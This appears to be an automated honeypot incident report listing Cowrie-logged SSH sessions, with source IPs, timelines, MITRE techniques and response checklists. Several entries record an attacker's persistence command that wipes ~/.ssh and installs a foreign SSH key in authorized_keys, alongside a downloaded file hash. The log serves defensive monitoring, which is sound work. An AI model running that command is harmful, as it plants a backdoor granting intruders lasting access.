### 🔴 HIGH · IR-48a9776eb5b8

| Field | Detail |
|---|---|
| **Source IP** | `34.79.0[.]187` |
| **First Seen** | 2026-07-02 09:07 |
| **Last Seen** | 2026-07-02 09:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:07:32` | `cowrie.session.connect` |
| `2026-07-02 09:07:32` | `cowrie.login.success` |
| `2026-07-02 09:07:33` | `cowrie.session.params` |
| `2026-07-02 09:07:33` | `cowrie.command.input` |
| `2026-07-02 09:07:33` | `cowrie.command.input` |
| `2026-07-02 09:07:33` | `cowrie.command.failed` |
| `2026-07-02 09:07:33` | `cowrie.command.input` |
| `2026-07-02 09:07:33` | `cowrie.log.closed` |
| `2026-07-02 09:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.0[.]187` to AbuseIPDB if not already reported
- [ ] Block `34.79.0[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f53a49c18ab

| Field | Detail |
|---|---|
| **Source IP** | `34.79.0[.]187` |
| **First Seen** | 2026-07-02 09:07 |
| **Last Seen** | 2026-07-02 09:08 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:07:46` | `cowrie.session.connect` |
| `2026-07-02 09:07:46` | `cowrie.login.success` |
| `2026-07-02 09:07:47` | `cowrie.session.params` |
| `2026-07-02 09:07:47` | `cowrie.command.input` |
| `2026-07-02 09:07:47` | `cowrie.command.failed` |
| `2026-07-02 09:08:05` | `cowrie.log.closed` |
| `2026-07-02 09:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.0[.]187` to AbuseIPDB if not already reported
- [ ] Block `34.79.0[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ef240c1fa2a

| Field | Detail |
|---|---|
| **Source IP** | `34.79.0[.]187` |
| **First Seen** | 2026-07-02 09:07 |
| **Last Seen** | 2026-07-02 09:08 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:07:48` | `cowrie.session.connect` |
| `2026-07-02 09:07:48` | `cowrie.login.success` |
| `2026-07-02 09:07:48` | `cowrie.session.params` |
| `2026-07-02 09:07:48` | `cowrie.command.input` |
| `2026-07-02 09:08:05` | `cowrie.log.closed` |
| `2026-07-02 09:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.0[.]187` to AbuseIPDB if not already reported
- [ ] Block `34.79.0[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f205f8802af6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 09:08 |
| **Last Seen** | 2026-07-02 09:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:08:55` | `cowrie.session.connect` |
| `2026-07-02 09:08:56` | `cowrie.client.version` |
| `2026-07-02 09:08:56` | `cowrie.client.kex` |
| `2026-07-02 09:08:58` | `cowrie.login.success` |
| `2026-07-02 09:09:01` | `cowrie.session.params` |
| `2026-07-02 09:09:01` | `cowrie.command.input` |
| `2026-07-02 09:09:01` | `cowrie.log.closed` |
| `2026-07-02 09:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3993b39d6140

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 09:09 |
| **Last Seen** | 2026-07-02 09:09 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:09:04` | `cowrie.session.connect` |
| `2026-07-02 09:09:06` | `cowrie.client.version` |
| `2026-07-02 09:09:06` | `cowrie.client.kex` |
| `2026-07-02 09:09:11` | `cowrie.login.success` |
| `2026-07-02 09:09:15` | `cowrie.session.params` |
| `2026-07-02 09:09:15` | `cowrie.command.input` |
| `2026-07-02 09:09:17` | `cowrie.log.closed` |
| `2026-07-02 09:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d34654c69f7

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 09:09 |
| **Last Seen** | 2026-07-02 09:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:09:50` | `cowrie.session.connect` |
| `2026-07-02 09:09:50` | `cowrie.client.version` |
| `2026-07-02 09:09:50` | `cowrie.client.kex` |
| `2026-07-02 09:09:52` | `cowrie.login.success` |
| `2026-07-02 09:09:54` | `cowrie.session.params` |
| `2026-07-02 09:09:54` | `cowrie.command.input` |
| `2026-07-02 09:09:54` | `cowrie.log.closed` |
| `2026-07-02 09:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2752783f977

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 09:11 |
| **Last Seen** | 2026-07-02 09:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:11:04` | `cowrie.session.connect` |
| `2026-07-02 09:11:04` | `cowrie.client.version` |
| `2026-07-02 09:11:04` | `cowrie.client.kex` |
| `2026-07-02 09:11:05` | `cowrie.login.success` |
| `2026-07-02 09:11:08` | `cowrie.session.params` |
| `2026-07-02 09:11:08` | `cowrie.command.input` |
| `2026-07-02 09:11:09` | `cowrie.log.closed` |
| `2026-07-02 09:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33a1989fcc1d

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]32` |
| **First Seen** | 2026-07-02 09:12 |
| **Last Seen** | 2026-07-02 09:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:12:30` | `cowrie.session.connect` |
| `2026-07-02 09:12:30` | `cowrie.client.version` |
| `2026-07-02 09:12:30` | `cowrie.client.kex` |
| `2026-07-02 09:12:31` | `cowrie.login.success` |
| `2026-07-02 09:12:32` | `cowrie.session.params` |
| `2026-07-02 09:12:32` | `cowrie.command.input` |
| `2026-07-02 09:12:32` | `cowrie.command.failed` |
| `2026-07-02 09:12:32` | `cowrie.log.closed` |
| `2026-07-02 09:12:33` | `cowrie.session.params` |
| `2026-07-02 09:12:33` | `cowrie.command.input` |
| `2026-07-02 09:12:33` | `cowrie.session.file_download` |
| `2026-07-02 09:12:33` | `cowrie.log.closed` |
| `2026-07-02 09:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95eb048930d

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]32` |
| **First Seen** | 2026-07-02 09:12 |
| **Last Seen** | 2026-07-02 09:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:12:33` | `cowrie.session.connect` |
| `2026-07-02 09:12:33` | `cowrie.client.version` |
| `2026-07-02 09:12:33` | `cowrie.client.kex` |
| `2026-07-02 09:12:33` | `cowrie.login.success` |
| `2026-07-02 09:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69ebbd01153f

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]32` |
| **First Seen** | 2026-07-02 09:12 |
| **Last Seen** | 2026-07-02 09:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:12:34` | `cowrie.session.connect` |
| `2026-07-02 09:12:34` | `cowrie.client.version` |
| `2026-07-02 09:12:34` | `cowrie.client.kex` |
| `2026-07-02 09:12:34` | `cowrie.login.success` |
| `2026-07-02 09:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b012f24cbd5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 09:13 |
| **Last Seen** | 2026-07-02 09:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:13:44` | `cowrie.session.connect` |
| `2026-07-02 09:13:44` | `cowrie.client.version` |
| `2026-07-02 09:13:44` | `cowrie.client.kex` |
| `2026-07-02 09:13:44` | `cowrie.login.success` |
| `2026-07-02 09:13:46` | `cowrie.session.params` |
| `2026-07-02 09:13:46` | `cowrie.command.input` |
| `2026-07-02 09:13:46` | `cowrie.log.closed` |
| `2026-07-02 09:13:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb5cee5a5bfa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 09:17 |
| **Last Seen** | 2026-07-02 09:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:17:45` | `cowrie.session.connect` |
| `2026-07-02 09:17:45` | `cowrie.client.version` |
| `2026-07-02 09:17:45` | `cowrie.client.kex` |
| `2026-07-02 09:17:45` | `cowrie.login.success` |
| `2026-07-02 09:17:47` | `cowrie.session.params` |
| `2026-07-02 09:17:47` | `cowrie.command.input` |
| `2026-07-02 09:17:47` | `cowrie.log.closed` |
| `2026-07-02 09:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44bc83bbc1d8

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-07-02 09:18 |
| **Last Seen** | 2026-07-02 09:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:18:46` | `cowrie.session.connect` |
| `2026-07-02 09:18:46` | `cowrie.client.version` |
| `2026-07-02 09:18:46` | `cowrie.client.kex` |
| `2026-07-02 09:18:47` | `cowrie.login.success` |
| `2026-07-02 09:18:48` | `cowrie.session.params` |
| `2026-07-02 09:18:48` | `cowrie.command.input` |
| `2026-07-02 09:18:48` | `cowrie.command.failed` |
| `2026-07-02 09:18:48` | `cowrie.log.closed` |
| `2026-07-02 09:18:49` | `cowrie.session.params` |
| `2026-07-02 09:18:49` | `cowrie.command.input` |
| `2026-07-02 09:18:49` | `cowrie.session.file_download` |
| `2026-07-02 09:18:49` | `cowrie.log.closed` |
| `2026-07-02 09:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95dc58bdd004

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-07-02 09:18 |
| **Last Seen** | 2026-07-02 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:18:49` | `cowrie.session.connect` |
| `2026-07-02 09:18:49` | `cowrie.client.version` |
| `2026-07-02 09:18:50` | `cowrie.client.kex` |
| `2026-07-02 09:18:50` | `cowrie.login.success` |
| `2026-07-02 09:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7086caec529a

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-07-02 09:18 |
| **Last Seen** | 2026-07-02 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:18:51` | `cowrie.session.connect` |
| `2026-07-02 09:18:51` | `cowrie.client.version` |
| `2026-07-02 09:18:51` | `cowrie.client.kex` |
| `2026-07-02 09:18:52` | `cowrie.login.success` |
| `2026-07-02 09:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49830a1b669b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 09:18 |
| **Last Seen** | 2026-07-02 09:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:18:54` | `cowrie.session.connect` |
| `2026-07-02 09:18:54` | `cowrie.client.version` |
| `2026-07-02 09:18:54` | `cowrie.client.kex` |
| `2026-07-02 09:18:54` | `cowrie.login.success` |
| `2026-07-02 09:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6766456eae2a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 09:18 |
| **Last Seen** | 2026-07-02 09:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:18:54` | `cowrie.session.connect` |
| `2026-07-02 09:18:54` | `cowrie.client.version` |
| `2026-07-02 09:18:54` | `cowrie.client.kex` |
| `2026-07-02 09:18:54` | `cowrie.login.success` |
| `2026-07-02 09:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ce4a74d3a5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 09:19 |
| **Last Seen** | 2026-07-02 09:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:19:49` | `cowrie.session.connect` |
| `2026-07-02 09:19:50` | `cowrie.client.version` |
| `2026-07-02 09:19:50` | `cowrie.client.kex` |
| `2026-07-02 09:19:56` | `cowrie.login.success` |
| `2026-07-02 09:19:59` | `cowrie.session.params` |
| `2026-07-02 09:19:59` | `cowrie.command.input` |
| `2026-07-02 09:20:01` | `cowrie.log.closed` |
| `2026-07-02 09:20:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13e6748f2145

| Field | Detail |
|---|---|
| **Source IP** | `140.83.83[.]72` |
| **First Seen** | 2026-07-02 09:23 |
| **Last Seen** | 2026-07-02 09:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:23:02` | `cowrie.session.connect` |
| `2026-07-02 09:23:02` | `cowrie.client.version` |
| `2026-07-02 09:23:02` | `cowrie.client.kex` |
| `2026-07-02 09:23:03` | `cowrie.login.success` |
| `2026-07-02 09:23:04` | `cowrie.session.params` |
| `2026-07-02 09:23:04` | `cowrie.command.input` |
| `2026-07-02 09:23:04` | `cowrie.command.failed` |
| `2026-07-02 09:23:05` | `cowrie.log.closed` |
| `2026-07-02 09:23:05` | `cowrie.session.params` |
| `2026-07-02 09:23:05` | `cowrie.command.input` |
| `2026-07-02 09:23:05` | `cowrie.session.file_download` |
| `2026-07-02 09:23:05` | `cowrie.log.closed` |
| `2026-07-02 09:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.83.83[.]72` to AbuseIPDB if not already reported
- [ ] Block `140.83.83[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2e8548eda5d

| Field | Detail |
|---|---|
| **Source IP** | `140.83.83[.]72` |
| **First Seen** | 2026-07-02 09:23 |
| **Last Seen** | 2026-07-02 09:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:23:07` | `cowrie.session.connect` |
| `2026-07-02 09:23:07` | `cowrie.client.version` |
| `2026-07-02 09:23:07` | `cowrie.client.kex` |
| `2026-07-02 09:23:08` | `cowrie.login.success` |
| `2026-07-02 09:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.83.83[.]72` to AbuseIPDB if not already reported
- [ ] Block `140.83.83[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-538099e5c2cc

| Field | Detail |
|---|---|
| **Source IP** | `140.83.83[.]72` |
| **First Seen** | 2026-07-02 09:23 |
| **Last Seen** | 2026-07-02 09:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:23:08` | `cowrie.session.connect` |
| `2026-07-02 09:23:08` | `cowrie.client.version` |
| `2026-07-02 09:23:08` | `cowrie.client.kex` |
| `2026-07-02 09:23:09` | `cowrie.login.success` |
| `2026-07-02 09:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.83.83[.]72` to AbuseIPDB if not already reported
- [ ] Block `140.83.83[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7382a5dd813e

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 09:23 |
| **Last Seen** | 2026-07-02 09:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:23:39` | `cowrie.session.connect` |
| `2026-07-02 09:23:40` | `cowrie.client.version` |
| `2026-07-02 09:23:40` | `cowrie.client.kex` |
| `2026-07-02 09:23:41` | `cowrie.login.success` |
| `2026-07-02 09:23:42` | `cowrie.session.params` |
| `2026-07-02 09:23:42` | `cowrie.command.input` |
| `2026-07-02 09:23:43` | `cowrie.log.closed` |
| `2026-07-02 09:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1f1389db73d

| Field | Detail |
|---|---|
| **Source IP** | `144.48.6[.]26` |
| **First Seen** | 2026-07-02 09:24 |
| **Last Seen** | 2026-07-02 09:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:24:19` | `cowrie.session.connect` |
| `2026-07-02 09:24:19` | `cowrie.client.version` |
| `2026-07-02 09:24:19` | `cowrie.client.kex` |
| `2026-07-02 09:24:21` | `cowrie.login.success` |
| `2026-07-02 09:24:22` | `cowrie.session.params` |
| `2026-07-02 09:24:22` | `cowrie.command.input` |
| `2026-07-02 09:24:22` | `cowrie.command.failed` |
| `2026-07-02 09:24:22` | `cowrie.log.closed` |
| `2026-07-02 09:24:23` | `cowrie.session.params` |
| `2026-07-02 09:24:23` | `cowrie.command.input` |
